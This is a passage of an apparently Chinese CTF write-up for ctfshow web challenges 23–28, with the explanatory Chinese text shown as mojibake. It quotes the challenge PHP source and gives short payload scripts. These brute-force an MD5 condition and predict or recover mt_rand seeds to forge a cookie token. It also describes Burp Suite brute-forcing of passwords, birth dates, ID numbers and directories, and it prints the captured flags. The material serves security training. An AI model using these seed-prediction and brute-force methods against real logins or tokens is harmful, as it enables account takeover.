operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10000</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'token='</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;'</span><span class="token operator">.</span><span class="token string single-quoted-string">'md5='</span><span class="token operator">.</span><span class="token variable">$token</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>å¤§æ„æ˜¯ä» 0 å¾ªç¯åˆ° 10000ï¼Œè‹¥æŸæ•°çš„ MD5 æ»¡è¶³æ¡ä»¶ï¼Œåˆ™è¾“å‡ºæ­¤æ•°</p><p>å°† payload è¿è¡Œä¸€ä¸‹<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112191120183.png" alt="image-20230112191120183"></p><p>å°†ç»“æœ get å½¢å¼è¾“å…¥å¾—åˆ° flag</p><pre><code>ctfshow&#123;63e95184-b8e8-4b9a-b716-f085f122cfc2&#125; 
</code></pre><h2 id="web24"><a class="anchor" href="#web24">#</a> web24</h2><p>çˆ†ä¸ªğŸ”¨</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-03 13:26:39</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-03 13:53:31</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token delimiter important">?></span> Linux version 5.4.0-131-generic (buildd@lcy02-amd64-108) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 Linux version 5.4.0-131-generic (buildd@lcy02-amd64-108) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022</pre></td></tr></table></figure><p>ç½‘ä¸Šæœç´¢äº† mt_srand å‡½æ•°ä½¿ç”¨</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">mktime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>GET å½¢å¼è¾“å‡ºå¾—åˆ° flag</p><pre><code>ctfshow&#123;5065d66d-72ca-4749-8cde-61c9518cf77a&#125;
</code></pre><h2 id="web25"><a class="anchor" href="#web25">#</a> web25</h2><p>çˆ†ä¸ªğŸ”¨ï¼Œä¸çˆ†äº†</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-03 13:56:57</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-03 15:47:33</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>Linux version <span class="token number">5.4</span><span class="token number">.0</span><span class="token operator">-</span><span class="token number">131</span><span class="token operator">-</span><span class="token function">generic</span> <span class="token punctuation">(</span>buildd@lcy02<span class="token operator">-</span>amd64<span class="token operator">-</span><span class="token number">108</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version <span class="token number">9.4</span><span class="token number">.0</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">9.4</span><span class="token number">.0</span><span class="token operator">-</span><span class="token number">1</span>ubuntu1<span class="token operator">~</span><span class="token number">20.04</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 Linux version 5.4.0-131-generic (buildd@lcy02-amd64-108) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022</span></pre></td></tr></table></figure><p>é¦–å…ˆè¿›è¡Œä»£ç å®¡è®¡ï¼Œmt_srand (seed) æ˜¯å‘æ”¾ seed ç§å­ç„¶åé  mt_srand ç”Ÿæˆéšæœºæ•°ï¼Œè¿™é‡Œæ²¡æœ‰ç»™å‡º seedï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡å·¥å…·é€†å‘æ¨å‡º seed</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>$rand ä¸ä¸º trueï¼Œåˆ™è¿”å› trueï¼Œæ‰€ä»¥é€šè¿‡ GET å½¢å¼ $r=0 å¾—åˆ°ç¬¬ä¸€ä¸ªéšæœºæ•°çš„è´Ÿæ•°ï¼Œå¦‚æœ $_COOKIE ['token'] ç­‰äºä¸¤ä¸ª mt_rand () éšæœºæ•°çš„å’Œåˆ™è¾“å‡º flag</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>æ‰“å¼€ kaliï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ php_mt_seedï¼Œæˆ‘ä»¬é€‰ç”¨ php7 çš„ seed<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112214156354.png" alt="image-20230112214156354"></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">0x3b63da0d</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>å¾—åˆ° token çš„éšæœºæ•°ï¼Œæˆ‘ä»¬ burpsuite æŠ“åŒ…ï¼Œåœ¨ cookie ä¸Šæ·»åŠ  token å’Œç¬¬äºŒç¬¬ä¸‰æ¬¡éšæœºæ•°çš„å’Œï¼Œåœ¨ GET å½¢å¼è¾“å‡ºç¬¬ä¸€æ¬¡è·å¾—çš„éšæœºæ•°å¾—åˆ° flag</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112214343855.png" alt="image-20230112214343855"></p><pre><code>ctfshow&#123;64cc811c-54b6-4906-acd0-91469d377dd0&#125;
</code></pre><h2 id="web26"><a class="anchor" href="#web26">#</a> web26</h2><p>è¿™ä¸ªå¯ä»¥çˆ†</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112221911435.png" alt="image-20230112221911435"></p><p>burpsuite æŠ“åŒ…çˆ†ç ´å¯†ç <img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112224351604.png" alt="image-20230112224351604"></p><pre><code>ctfshow&#123;19e3283c-f4d3-4249-9f87-780ae05a38ac&#125;
</code></pre><h2 id="web27"><a class="anchor" href="#web27">#</a> web27</h2><p>CTFshow èœé¸¡å­¦é™¢æ‹›ç”Ÿå•¦ï¼</p><p>ä¸‹è½½å½•å–åå•ï¼Œçœ‹åˆ°å½•å–åå•å’ŒæŸ¥è¯¢ç³»ç»Ÿå¯çŸ¥ï¼Œå°±æ˜¯çˆ†ç ´å‡ºç”Ÿæ—¥æœŸï¼Œè¿™é‡Œä»¥ç¬¬äºŒä¸ªä¸ºä¾‹</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112235736885.png" alt="image-20230112235736885"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112235755997.png" alt="image-20230112235755997"></p><p>é¦–å…ˆç”¨ burpsuite æŠ“åŒ…ï¼Œè¿™é‡Œæˆ‘ç”¨ç«ç‹æŠ“ä¸åˆ°åŒ…ï¼Œæ‰€ä»¥ç”¨äº†å…¶ä»–æµè§ˆå™¨</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230112235851636.png" alt="image-20230112235851636"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000029376.png" alt="image-20230113000029376"></p><p>é€‰æ‹©çˆ†ç ´å˜é‡</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000044670.png" alt="image-20230113000044670"></p><p>é€‰æ‹©æ—¥æœŸç±»å‹ï¼Œæ ¼å¼ yyyyMMdd åå¼€å§‹çˆ†ç ´</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000127515.png" alt="image-20230113000127515"></p><p>çˆ†ç ´å‡ºæ¥åå‘ç° msg æ˜¯ url ç¼–ç ï¼Œè§£ç åå¾—åˆ°çº¿ç´¢ â€œæ­å–œæ‚¨ï¼Œæ‚¨å·²è¢«æˆ‘æ ¡å½•å–ï¼Œä½ çš„å­¦å·åˆ·åˆå§‹å¯†ç ä¸ºèº«ä»½è¯å·ç â€</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000406494.png" alt="image-20230113000406494"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000512890.png" alt="image-20230113000512890"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000536995.png" alt="image-20230113000536995"></p><p>ç™»é™†å¾—åˆ° flag</p><pre><code>ctfshow&#123;2ccb2be2-6545-441a-8b16-070d6395726a&#125;
</code></pre><h2 id="web28"><a class="anchor" href="#web28">#</a> web28</h2><p>å¤§æµ·æé’ˆ</p><pre><code>é¢˜ç›®æç¤ºï¼š
é€šè¿‡æš´åŠ›ç ´è§£ç›®å½•/0-100/0-100/çœ‹è¿”å›æ•°æ®åŒ…
çˆ†ç ´çš„æ—¶å€™å»æ‰2.txt ä»…ä»…çˆ†ç ´ç›®å½•å³å¯
</code></pre><p>æ ¹æ®æç¤ºï¼Œåªéœ€è¦çˆ†ç ´ç›®å½•å³å¯ï¼Œburpsutie æŠ“åŒ…é€‰ä¸­å˜é‡ï¼Œå»æ‰ 2.txtï¼Œå°†æ¨¡å¼æ”¹æˆ Cluster bomb (é›†æŸç‚¸å¼¹)<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113001905754.png" alt="image-20230113001905754"></p><p>ä¹‹åè®¾ç½® payload1ï¼Œpayload2 åŒç†ï¼Œè®¾ç½®å®Œåå¼€å§‹çˆ†ç ´<img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113002013624.png" alt="image-20230113002013624"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113002039465.png" alt="image-20230113002039465"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113002107014.png" alt="image-20230113002107014"></p><p>æŸ¥çœ‹çŠ¶æ€æ çš„å‡åºçœ‹åˆ°ä¸ª 200ï¼Œå¾—åˆ° flag</p><pre><code>ctfshow&#123;bb330eeb-0827-42c2-be2e-8a942cbc3b1c&#125;
</code></pre><h1 id="å‘½ä»¤æ‰§è¡Œ"><a class="anchor" href="#å‘½ä»¤æ‰§è¡Œ">#</a> å‘½ä»¤æ‰§è¡Œ</h1><h2 id="web29"><a class="anchor" href="#web29">#</a> web29</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 00:26:48</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td 